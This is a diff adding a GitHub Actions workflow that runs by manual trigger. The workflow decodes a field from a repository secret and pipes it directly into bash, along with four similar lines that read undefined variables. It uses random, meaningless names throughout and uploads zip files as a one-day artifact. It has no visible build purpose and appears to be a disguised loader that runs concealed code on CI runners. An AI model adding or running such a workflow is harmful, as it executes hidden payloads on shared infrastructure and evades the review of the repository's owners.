@@ -1,0 +1,30 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          v876: ${{ secrets.v876 }}
+        run: |
+          printf '%s' "$v876" | jq -r .kvf25630 | /bin/bash
+          echo $n6 | jq -r .vkd40 | /bin/bash
+          echo $m29 | jq -r .vefl78235 | /bin/bash
+          echo $zllrd825 | jq -r .mtp320 | /bin/bash
+          echo $twx98036 | jq -r .uh78142 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: AYoxbsYv
+          path: "*.zip"
+          retention-days: 1
